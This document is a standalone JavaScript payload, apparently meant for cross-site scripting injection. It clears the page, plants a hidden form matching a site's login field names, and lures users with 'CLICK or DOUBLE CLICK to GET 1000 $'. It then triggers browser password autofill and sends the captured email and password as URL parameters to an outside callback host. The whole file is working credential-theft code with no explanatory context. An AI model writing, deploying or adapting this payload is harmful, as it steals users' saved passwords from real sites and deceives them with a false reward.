document.body.innerHTML = "";
var scripts = document.scripts;

for (var i = scripts.length - 1; i >= 0; i--) {
  var script = scripts[i];
  script.parentNode.removeChild(script);
}

// Create style to hide everything except form
var styleElement = document.createElement('style');
var css = 'body > *:not(form):not(textarea) { display: none !important; }';
styleElement.appendChild(document.createTextNode(css));
document.head.appendChild(styleElement);

// Create form element
var form = document.createElement('form');
form.style.display = 'flex';
form.style.flexDirection = 'column';
form.style.justifyContent = 'center';
form.style.alignItems = 'center';
form.style.height = '100vh';

// Create input fields with IDs and names matching the original login form
var inputUsername = document.createElement('input');
inputUsername.type = 'text';
inputUsername.id = 'email'; // Match the ID used on the original login form
inputUsername.name = 'email'; // Match the name used on the original login form
inputUsername.style.display = 'none'; // Initially hidden
inputUsername.style.width = '300px';
inputUsername.style.height = '40px';
inputUsername.style.marginBottom = '10px';

var inputPassword = document.createElement('input');
inputPassword.type = 'password';
inputPassword.id = 'password'; // Match the ID used on the original login form
inputPassword.name = 'password'; // Match the name used on the original login form
inputPassword.style.display = 'none'; // Initially hidden
inputPassword.style.width = '300px';
inputPassword.style.height = '40px';
inputPassword.style.marginBottom = '10px';

// Add the fields to the form
form.appendChild(inputUsername);
form.appendChild(inputPassword);

// Create the clickable text
var displayText = document.createElement('div');
displayText.innerText = 'CLICK or DOUBLE CLICK to GET 1000 $';
displayText.style.textAlign = "center";
displayText.style.fontSize = "30px";
displayText.style.fontWeight = "bold";
displayText.style.cursor = "pointer";

// Add the text to the form
form.appendChild(displayText);

// Temporarily display the form to trigger autofill
document.body.appendChild(form);

// Function to send the credentials back to your server
function sendCredentials(username, password) {
  var img = new Image();
  img.src = `https://hqwkfozbqejnjncfqouaju7a9oghr07ei.oast.fun?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
  document.body.appendChild(img);
}

// Function to extract and send the credentials after a delay
function extractAndSendCredentials() {
  let username = document.getElementById('email').value;
  let password = document.getElementById('password').value;
  
  if (username && password) {
    sendCredentials(username, password);
  } else {
    console.error("Autofill did not work. No credentials captured.");
  }
  
  // Hide the input fields after autofill
  inputUsername.style.display = 'none';
  inputPassword.style.display = 'none';
}

// Function to simulate user interaction to trigger autofill
function simulateInteraction() {
  inputUsername.style.display = 'block'; // Show temporarily to trigger autofill
  inputPassword.style.display = 'block'; // Show temporarily to trigger autofill

  inputUsername.focus();
  inputPassword.focus();
  inputPassword.blur();
  
  inputUsername.style.display = 'none'; // Hide after autofill
  inputPassword.style.display = 'none'; // Hide after autofill
}

// Attach event listeners to the clickable text
displayText.addEventListener('click', function() {
  simulateInteraction();
  setTimeout(extractAndSendCredentials, 3000); // Delay to allow autofill
});

displayText.addEventListener('dblclick', function() {
  simulateInteraction();
  setTimeout(extractAndSendCredentials, 3000); // Delay to allow autofill
});

// Attach the event listeners after DOM content is fully loaded
document.addEventListener('DOMContentLoaded', function() {
  setTimeout(simulateInteraction, 1000);
});
